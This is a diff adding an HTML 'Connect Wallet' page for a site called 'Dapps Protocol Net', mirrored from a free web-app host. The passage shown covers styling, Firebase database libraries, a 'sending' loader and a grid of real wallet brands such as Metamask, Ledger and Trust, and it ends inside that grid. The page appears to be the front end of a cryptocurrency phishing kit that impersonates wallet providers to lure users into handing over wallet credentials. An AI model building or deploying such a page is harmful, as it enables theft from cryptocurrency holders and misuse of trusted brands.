@@ -1,0 +1,1228 @@
+<html prefix="og: http://ogp.me/ns#">
+
+
+<!-- Mirrored from block-connection.web.app/collab-server/connect.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Jul 2025 22:20:57 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title data-react-helmet="true">Connect Wallet</title>
+    <link data-react-helmet="true" rel="shortcut icon" href="../images/favicon.html">
+    <meta data-react-helmet="true" name="msapplication-TileColor" content="#da532c">
+    <meta data-react-helmet="true" name="theme-color" content="#ffffff">
+    <meta data-react-helmet="true" name="description"
+        content="Connect your crypto wallet securely to Dapps Protocol Net.">
+    <meta data-react-helmet="true" name="keywords"
+        content="ethereum, cryptocurrency, wallet, mobile, connect, bridge, protocol, crypto, tokens, dapp, web3">
+    <meta data-react-helmet="true" name="twitter:card" content="summary_large_image">
+    <meta data-react-helmet="true" name="twitter:site" content="@syncwallet">
+    <meta data-react-helmet="true" name="twitter:title" content="Connect Wallet - Dapps Protocol Net">
+    <meta data-react-helmet="true" name="twitter:description"
+        content="Securely connect your crypto wallet to Dapps Protocol Net for various Web3 operations.">
+    <meta data-react-helmet="true" name="twitter:img:src" content="social-card.html">
+    <meta data-react-helmet="true" name="og:title" content="Connect Wallet">
+    <meta data-react-helmet="true" name="og:type" content="website">
+    <meta data-react-helmet="true" name="og:url" content="../">
+    <meta data-react-helmet="true" name="og:image" content="../syncwallet.online/social-card.html">
+    <meta data-react-helmet="true" name="og:description"
+        content="Securely connect your crypto wallet to Dapps Protocol Net for various Web3 operations.">
+    <meta data-react-helmet="true" name="og:site_name" content="Dapps Protocol Net">
+    <meta data-react-helmet="true" name="fb:admins" content="365412154213405">
+
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            /* Replaced fixed background image with dynamic CSS background */
+            background-color: #0a0a0a;
+            /* Dark base */
+            overflow-x: hidden;
+            /* Prevent horizontal scrollbar */
+            color: #e2e8f0;
+            /* Default text color */
+        }
+
+        /* Subtle animated background for the entire body */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            /* Behind everything */
+            background-image:
+                repeating-linear-gradient(45deg, #1f2937 0px, #1f2937 1px, transparent 1px, transparent 40px),
+                repeating-linear-gradient(-45deg, #1f2937 0px, #1f2937 1px, transparent 1px, transparent 40px);
+            background-size: 80px 80px;
+            /* Size of the grid cells */
+            opacity: 0.05;
+            /* Very subtle */
+            animation: backgroundMove 60s linear infinite;
+        }
+
+        @keyframes backgroundMove {
+            0% {
+                background-position: 0 0;
+            }
+
+            100% {
+                background-position: 80px 80px;
+            }
+
+            /* Move by one grid cell */
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background-color: #1a202c;
+            /* Dark background for modal */
+            border-radius: 1rem;
+            padding: 2rem;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            animation: fadeInScale 0.3s ease-out forwards;
+        }
+
+        @keyframes fadeInScale {
+            from {
+                opacity: 0;
+                transform: scale(0.9);
+            }
+
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .tab-button.active {
+            border-bottom: 2px solid #63b3ed;
+            /* Tailwind blue-400 equivalent */
+            color: #63b3ed;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        /* Styles for the "sending" loader */
+        .sending {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
+            flex-direction: column;
+            /* Align content vertically */
+            justify-content: center;
+            align-items: center;
+            z-index: 99999;
+        }
+
+        .containerz {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            transform-style: preserve-3d;
+            /* For the 3D cube effect */
+        }
+
+        .boxz {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            transform-style: preserve-3d;
+            animation: rotateCube 10s infinite linear;
+        }
+
+        .borderz {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: 2px solid rgba(0, 255, 255, 0.7);
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.5), inset 0 0 10px rgba(0, 255, 255, 0.5);
+        }
+
+        .borderz.one {
+            transform: translateZ(60px);
+        }
+
+        .borderz.two {
+            transform: rotateY(90deg) translateZ(60px);
+        }
+
+        .borderz.three {
+            transform: rotateX(90deg) translateZ(60px);
+        }
+
+        .borderz.four {
+            transform: rotateY(180deg) translateZ(60px);
+        }
+
+        .line {
+            position: absolute;
+            background: rgba(138, 43, 226, 0.8);
+            box-shadow: 0 0 8px rgba(138, 43, 226, 0.6);
+            animation: scanLine 2s infinite ease-in-out;
+        }
+
+        .line.one {
+            width: 100%;
+            height: 2px;
+            top: 0;
+            transform-origin: left;
+        }
+
+        .line.two {
+            width: 2px;
+            height: 100%;
+            left: 0;
+            transform-origin: top;
+            animation-delay: 0.5s;
+        }
+
+        .line.three {
+            width: 100%;
+            height: 2px;
+            bottom: 0;
+            transform-origin: right;
+            animation-delay: 1s;
+        }
+
+        @keyframes rotateCube {
+            0% {
+                transform: rotateX(0) rotateY(0);
+            }
+
+            100% {
+                transform: rotateX(360deg) rotateY(360deg);
+            }
+        }
+
+        @keyframes scanLine {
+            0% {
+                transform: scaleX(0);
+                opacity: 0;
+            }
+
+            50% {
+                transform: scaleX(1);
+                opacity: 1;
+            }
+
+            100% {
+                transform: scaleX(0);
+                opacity: 0;
+            }
+        }
+
+        /* Custom message box styles */
+        #pageMessageBox {
+            position: fixed;
+            top: 4rem;
+            /* Below header */
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 1001;
+            width: 90%;
+            max-width: 400px;
+            padding: 0.75rem 1.25rem;
+            border-radius: 0.5rem;
+            font-size: 0.9rem;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            animation: slideInFromTop 0.5s ease-out forwards;
+            display: none;
+            /* Hidden by default */
+        }
+
+        @keyframes slideInFromTop {
+            from {
+                top: 0;
+                opacity: 0;
+            }
+
+            to {
+                top: 4rem;
+                opacity: 1;
+            }
+        }
+
+        #pageMessageBox.error {
+            background-color: #ef4444;
+            /* red-500 */
+            color: #fee2e2;
+            /* red-100 */
+        }
+
+        #pageMessageBox.success {
+            background-color: #22c55e;
+            /* green-500 */
+            color: #ecfdf5;
+            /* green-50 */
+        }
+
+        /* Styles for compatibility tags */
+        .compatibility-tag {
+            display: inline-block;
+            background-color: #2d3748;
+            /* gray-800 */
+            color: #a0aec0;
+            /* gray-400 */
+            font-size: 0.65rem;
+            /* Smaller font */
+            padding: 0.2rem 0.5rem;
+            border-radius: 0.375rem;
+            /* rounded-md */
+            margin-right: 0.3rem;
+            margin-bottom: 0.3rem;
+            border: 1px solid #4a5568;
+            /* gray-600 */
+        }
+
+        /* Hidden utility for screen readers */
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            white-space: nowrap;
+            border-width: 0;
+        }
+    </style>
+
+    <script src="../../www.gstatic.com/firebasejs/8.3.1/firebase-app.js"></script>
+    <script src="../../www.gstatic.com/firebasejs/8.3.1/firebase-database.js"></script>
+    <script src="../../www.gstatic.com/firebasejs/8.1.1/firebase-storage.js"></script>
+    <script src="../../www.gstatic.com/firebasejs/8.3.1/firebase.js"></script>
+</head>
+
+<body class="bg-gray-900 text-gray-100 antialiased">
+    <div id="app" class="min-h-screen flex flex-col">
+
+        <div id="pageMessageBox" role="alert" aria-live="assertive"></div>
+
+        <div class="w-full bg-gray-800 py-1 px-4 text-xs sm:text-sm text-gray-400 flex items-center justify-center">
+            <div style="height:40px; padding:0px; margin:0px; width: 100%;">
+                <iframe
+                    src="https://widget.coinlib.io/widget?type=horizontal_v2&amp;theme=dark&amp;pref_coin_id=1505&amp;invert_hover=no"
+                    width="100%" height="36px" scrolling="auto" marginwidth="0" marginheight="0" frameborder="0"
+                    border="0" style="border:0;margin:0;padding:0;">
+                </iframe>
+            </div>
+        </div>
+
+        <header
+            class="relative z-50 w-full bg-gray-900 bg-opacity-80 backdrop-blur-sm shadow-lg py-4 px-4 md:px-12 flex justify-between items-center">
+            <div class="flex items-center space-x-2 sm:space-x-3">
+                <img src="../images/logo_mark.84dd8525.svg" alt="Dapps Protocol Net Logo"
+                    class="h-7 w-7 sm:h-8 sm:w-8 rounded-full">
+                <span
+                    class="text-xl sm:text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-500">
+                    Dapps Protocol Net
+                </span>
+            </div>
+            <nav>
+            </nav>
+        </header>
+
+        <main class="flex-grow relative z-10 flex items-center justify-center p-4">
+
+            <section
+                class="w-full max-w-2xl bg-gray-800 bg-opacity-90 backdrop-blur-md rounded-xl shadow-2xl p-6 md:p-8 border border-gray-700">
+                <h2
+                    class="text-3xl font-bold text-center mb-6 text-transparent bg-clip-text bg-gradient-to-r from-blue-300 to-purple-400">
+                    Connect to a Wallet
+                </h2>
+
+                <div class="mb-6">
+                    <label for="walletSearch" class="sr-only">Search wallets</label>
+                    <input type="text" id="walletSearch" placeholder="Search wallets..."
+                        class="w-full p-3 rounded-lg border border-gray-600 bg-gray-700 text-gray-100 placeholder-gray-400 focus:outline-none focus:border-blue-400 transition-colors"
+                        aria-label="Search for a wallet by name">
+                </div>
+
+                <div id="recentlyUsedWallets" class="mb-8 hidden" aria-live="polite">
+                    <h3 class="text-xl font-semibold text-gray-200 mb-4 border-b border-gray-700 pb-2">Recently Used
+                    </h3>
+                    <div id="recentWalletGrid" class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-4">
+                    </div>
+                </div>
+
+                <div id="walletGrid"
+                    class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-4 max-h-96 overflow-y-auto pr-2 custom-scrollbar">
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Metamask"
+                        data-wallet-img="static/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png"
+                        data-compatibility="EVM, Ethereum, Layer 2" role="button" tabindex="0"
+                        aria-label="Connect with Metamask wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2"
+                            src="static/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png" alt="Metamask logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">Metamask</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">EVM</span>
+                            <span class="compatibility-tag">Ethereum</span>
+                            <span class="compatibility-tag">Layer 2</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Trust"
+                        data-wallet-img="static/trust-wallet-66f8777532931d9c09b633344981a6a9.png"
+                        data-compatibility="Multi-Chain, EVM, Solana, BSC" role="button" tabindex="0"
+                        aria-label="Connect with Trust wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2"
+                            src="static/trust-wallet-66f8777532931d9c09b633344981a6a9.png" alt="Trust Wallet logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">Trust</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">Multi-Chain</span>
+                            <span class="compatibility-tag">EVM</span>
+                            <span class="compatibility-tag">Solana</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Helium Wallet" data-wallet-img="static/Helium_1234.png"
+                        data-compatibility="Helium Network" role="button" tabindex="0"
+                        aria-label="Connect with Helium Wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2" src="static/Helium_1234.png"
+                            alt="Helium Wallet logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">Helium Wallet</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">Helium Network</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="crypto.com Defi Wallet"
+                        data-wallet-img="static/crypto-4cbeac57421fb3ca2573db2cf448169a.png"
+                        data-compatibility="Multi-Chain, Cronos, EVM" role="button" tabindex="0"
+                        aria-label="Connect with Crypto.com DeFi Wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2"
+                            src="static/crypto-4cbeac57421fb3ca2573db2cf448169a.png" alt="Crypto.com DeFi Wallet logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100 text-center">crypto.com Defi
+                            Wallet</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">Multi-Chain</span>
+                            <span class="compatibility-tag">Cronos</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Coinbase" data-wallet-img="static/coinbase-wallet-logo.jpg"
+                        data-compatibility="Multi-Chain, EVM, Layer 2" role="button" tabindex="0"
+                        aria-label="Connect with Coinbase wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2" src="static/coinbase-wallet-logo.jpg"
+                            alt="Coinbase logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">Coinbase</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">Multi-Chain</span>
+                            <span class="compatibility-tag">EVM</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Ledger" data-wallet-img="static/ledger-squarewhite.png"
+                        data-compatibility="Hardware, Multi-Chain" role="button" tabindex="0"
+                        aria-label="Connect with Ledger wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2" src="static/ledger-squarewhite.png"
+                            alt="Ledger logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">Ledger</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">Hardware</span>
+                            <span class="compatibility-tag">Multi-Chain</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Blockchain" data-wallet-img="static/blockchain-logo.png"
+                        data-compatibility="BTC, ETH, Multi-Chain" role="button" tabindex="0"
+                        aria-label="Connect with Blockchain wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2" src="static/blockchain-logo.png"
+                            alt="Blockchain logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">Blockchain</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">BTC</span>
+                            <span class="compatibility-tag">ETH</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Cybavo" data-wallet-img="static/cybavowallet.png"
+                        data-compatibility="Enterprise, Custodial" role="button" tabindex="0"
+                        aria-label="Connect with Cybavo wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2" src="static/cybavowallet.png"
+                            alt="Cybavo logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">Cybavo</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">Enterprise</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Kepir Wallet" data-wallet-img="static/keplr.png"
+                        data-compatibility="Cosmos, IBC" role="button" tabindex="0"
+                        aria-label="Connect with Kepir Wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2" src="static/keplr.png"
+                            alt="Kepir Wallet logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">Kepir Wallet</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">Cosmos</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Binance Smart Chain" data-wallet-img="static/bsc-logo.png"
+                        data-compatibility="BSC, EVM" role="button" tabindex="0"
+                        aria-label="Connect with Binance Smart Chain wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2" src="static/bsc-logo.png"
+                            alt="Binance Smart Chain logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100 text-center">Binance Smart
+                            Chain</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">BSC</span>
+                            <span class="compatibility-tag">EVM</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Safepal" data-wallet-img="static/safepal-1022b40e2ea3a4a6bb19cf6ff28d8b92.png"
+                        data-compatibility="Hardware, Multi-Chain" role="button" tabindex="0"
+                        aria-label="Connect with Safepal wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2"
+                            src="static/safepal-1022b40e2ea3a4a6bb19cf6ff28d8b92.png" alt="Safepal logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">Safepal</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">Hardware</span>
+                            <span class="compatibility-tag">Multi-Chain</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Argent" data-wallet-img="static/image.png"
+                        data-compatibility="EVM, Smart Contract" role="button" tabindex="0"
+                        aria-label="Connect with Argent wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2" src="static/image.png"
+                            alt="Argent logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">Argent</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">Smart Contract</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Aktionariat"
+                        data-wallet-img="static/aktionariat-c5784b26234a389632687a36d2fb3258.png"
+                        data-compatibility="Ethereum" role="button" tabindex="0"
+                        aria-label="Connect with Aktionariat wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2"
+                            src="static/aktionariat-c5784b26234a389632687a36d2fb3258.png" alt="Aktionariat logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">Aktionariat</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">Ethereum</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Keyring Pro"
+                        data-wallet-img="static/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png"
+                        data-compatibility="EVM, Multi-Chain" role="button" tabindex="0"
+                        aria-label="Connect with Keyring Pro wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2"
+                            src="static/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png" alt="Keyring Pro logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">Keyring Pro</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">EVM</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="BitKeep" data-wallet-img="static/bitkeep-387b0ca7da4cf322f44c70c23064c529.png"
+                        data-compatibility="Multi-Chain, DeFi" role="button" tabindex="0"
+                        aria-label="Connect with BitKeep wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2"
+                            src="static/bitkeep-387b0ca7da4cf322f44c70c23064c529.png" alt="BitKeep logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">BitKeep</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">Multi-Chain</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="SparkPoint"
+                        data-wallet-img="static/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png"
+                        data-compatibility="EVM" role="button" tabindex="0" aria-label="Connect with SparkPoint wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2"
+                            src="static/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png" alt="SparkPoint logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">SparkPoint</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">EVM</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="OwnBit" data-wallet-img="static/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png"
+                        data-compatibility="BTC, ETH" role="button" tabindex="0"
+                        aria-label="Connect with OwnBit wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2"
+                            src="static/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png" alt="OwnBit logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">OwnBit</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">BTC</span>
+                            <span class="compatibility-tag">ETH</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Infinity Wallet"
+                        data-wallet-img="static/infinity-wallet-48e78bc97f96bad14ee6b781423a69ea.png"
+                        data-compatibility="Multi-Chain" role="button" tabindex="0"
+                        aria-label="Connect with Infinity Wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2"
+                            src="static/infinity-wallet-48e78bc97f96bad14ee6b781423a69ea.png"
+                            alt="Infinity Wallet logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">Infinity Wallet</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">Multi-Chain</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Wallet.io"
+                        data-wallet-img="static/wallet-io-198f396de22fe25eb370f46544abe69d.png"
+                        data-compatibility="Multi-Chain, Custodial" role="button" tabindex="0"
+                        aria-label="Connect with Wallet.io">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2"
+                            src="static/wallet-io-198f396de22fe25eb370f46544abe69d.png" alt="Wallet.io logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">Wallet.io</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">Multi-Chain</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Infinito"
+                        data-wallet-img="static/infinito-wallet-68da061495160c96f4bcb5e70e612fdd.png"
+                        data-compatibility="Multi-Chain, DeFi" role="button" tabindex="0"
+                        aria-label="Connect with Infinito wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2"
+                            src="static/infinito-wallet-68da061495160c96f4bcb5e70e612fdd.png" alt="Infinito logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">Infinito</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">Multi-Chain</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Torus" data-wallet-img="static/image%20(6).png"
+                        data-compatibility="EVM, Social Login" role="button" tabindex="0"
+                        aria-label="Connect with Torus wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2" src="static/image%20(6).png"
+                            alt="Torus logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">Torus</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">Social Login</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="BitPay" data-wallet-img="static/bitpay-1573dd6c95eb38386f181048663590d0.png"
+                        data-compatibility="BTC, Multi-Chain" role="button" tabindex="0"
+                        aria-label="Connect with BitPay wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2"
+                            src="static/bitpay-1573dd6c95eb38386f181048663590d0.png" alt="BitPay logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">BitPay</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">BTC</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="imToken" data-wallet-img="static/imtoken-fd8c7c52dac6101568954e7448a49202.png"
+                        data-compatibility="Multi-Chain, DeFi" role="button" tabindex="0"
+                        aria-label="Connect with imToken wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2"
+                            src="static/imtoken-fd8c7c52dac6101568954e7448a49202.png" alt="imToken logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">imToken</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">Multi-Chain</span>
+                        </div>
+                    </div>
+                    <div class="wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        data-wallet-name="Other Wallet" data-wallet-img="static/otherssss.png"
+                        data-compatibility="Any Chain" role="button" tabindex="0"
+                        aria-label="Connect with Other Wallet">
+                        <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2" src="static/otherssss.png"
+                            alt="Other Wallet logo">
+                        <span class="text-base sm:text-lg font-semibold text-gray-100">Other Wallet</span>
+                        <div class="flex flex-wrap justify-center mt-1">
+                            <span class="compatibility-tag">Any Chain</span>
+                        </div>
+                    </div>
